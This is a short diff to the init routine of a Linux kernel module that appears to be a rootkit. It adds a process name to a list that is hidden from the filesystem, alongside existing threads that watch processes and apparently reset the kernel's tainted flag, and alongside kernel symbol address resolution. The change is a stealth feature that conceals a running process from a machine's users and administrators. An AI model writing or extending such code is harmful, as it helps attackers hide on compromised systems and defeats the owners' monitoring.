@@ -709,6 +709,7 @@ static int __init kv_init(void) {
 
     int rv = 0;
     char *magik, *procname_err = "";
+    const char *hideprocname[] = {PROCNAME, NULL};
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5,17,0)
     struct kernel_syscalls *kaddr = NULL;
 #endif
@@ -733,6 +734,7 @@ static int __init kv_init(void) {
     if (!sys_init())
         goto sys_init_error;
 
+
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5,17,0)
     kaddr = kv_kall_load_addr();
     if (!kaddr || !kaddr->k_do_exit)
@@ -741,6 +743,8 @@ static int __init kv_init(void) {
     tsk_prc = kthread_run(_proc_watchdog, NULL, THREAD_PROC_NAME);
     if (!tsk_prc)
         goto unroll_init;
+
+    fs_add_name_ro(hideprocname);
 
     tsk_tainted = kthread_run(_reset_tainted, NULL, THREAD_TAINTED_NAME);
     if (!tsk_tainted)
